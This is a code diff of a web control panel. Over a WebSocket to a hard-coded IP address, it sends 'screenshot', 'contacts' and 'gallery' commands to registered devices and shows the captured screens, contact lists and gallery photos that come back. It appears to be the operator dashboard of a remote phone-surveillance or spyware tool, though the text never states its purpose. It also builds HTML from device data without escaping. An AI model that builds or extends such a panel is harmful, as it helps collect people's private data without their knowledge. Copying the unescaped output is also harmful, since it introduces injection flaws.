@@ -31,28 +31,71 @@
        <button class="btn btn-success" onclick="logout()">Logout</button>
        <br>
        <div id="device_table"></div>
+       <div id="image_display"></div>
      </div>
    </div>
    <script>
-   var conn = new WebSocket('ws://localhost:8080');
+   var conn = new WebSocket('ws://43.228.237.131:8080');
+  //  var conn = new WebSocket('ws://localhost:8080');
    	conn.onopen = function(e) {
    	    console.log("Connection established!");
-
    	};
 
     conn.onmessage = function(e) {
   		var msg = JSON.parse(e.data);
+      if(msg.type=="screenshot"){
+        $("#image_display").html("<img src=\"data:image/png;base64,"+msg.image+"\">");
+      }else if(msg.type=="contact"){
+        alert("contacts are here");
+        var htmlString="<table class=\"table\"><thead><tr><th>ID</th><th>Name</th><th>Phones</th></tr></thead>";
+        var conts=JSON.parse(msg.list);
+        $.each(conts, function(index,value) {
+          htmlString+="<tr>";
+          htmlString+="<td>"+value.id+"</td>";
+          htmlString+="<td>"+value.name+"</td>";
+          htmlString+="<td>"+value.phones+"</td>";
+          htmlString+="</tr>";
+         });
+        htmlString+="</table>";
+        $("#image_display").html(htmlString);
+      }else if(msg.type=="gallery"){
+        var img = JSON.parse(msg.list);
+
+        $("#image_display").html("<img class=\"devimg\" src=\"data:image/png;base64,"+img.img1+"\"><br><hr><img class=\"devimg\" src=\"data:image/png;base64,"+img.img2+"\"><br><hr><img class=\"devimg\" src=\"data:image/png;base64,"+img.img3+"\">");
+      }
   		console.log(msg);
   	};
     //conn.send(JSON.stringify(msg));
 
     function screenshot(id){
-      var msg={"device":id,"cmd":"screenshot"};
+      var msg={};
+      msg.device=id;
+      msg.cmd="screenshot";
       msg=JSON.stringify(msg);
       console.log("sending : "+msg);
-      conn.send(JSON.stringify(msg));
+        $("#image_display").html("<h1>Getting new Image</h1>");
+      conn.send(msg);
     }
 
+    function contacts(id){
+      var msg={};
+      msg.device=id;
+      msg.cmd="contacts";
+      msg=JSON.stringify(msg);
+      console.log("sending : "+msg);
+        $("#image_display").html("<h1>Getting Contacts</h1>");
+      conn.send(msg);
+    }
+
+    function gallery(id){
+      var msg={};
+      msg.device=id;
+      msg.cmd="gallery";
+      msg=JSON.stringify(msg);
+      console.log("sending : "+msg);
+        $("#image_display").html("<h1>Getting Gallery</h1>");
+      conn.send(msg);
+    }
 
    $(document).ready(function(){
      $.getJSON("./db/get_devices.php",function(data){
@@ -74,11 +117,12 @@
           if(value.active==0){
             htmlString+="Wait till active";
           }else{
-            htmlString+="<button class=\"btn btn-primary\" onclick=\"screenshot("+value.id+")\" >Screenshot</button>";
+            htmlString+="<button class=\"btn btn-primary\" onclick=\"screenshot("+value.id+")\" >Screenshot</button><br>";
+            htmlString+="<button class=\"btn btn-primary\" onclick=\"contacts("+value.id+")\" >Request Contacts</button><br>";
+            htmlString+="<button class=\"btn btn-primary\" onclick=\"gallery("+value.id+")\" >Request Gallery</button><br>";
           }
           htmlString+="</td>";
          htmlString+="</tr>";
-         htmlString+="<td>"+value.account+"</td>";
         });
        htmlString+="</table>";
        $("#device_table").html(htmlString);
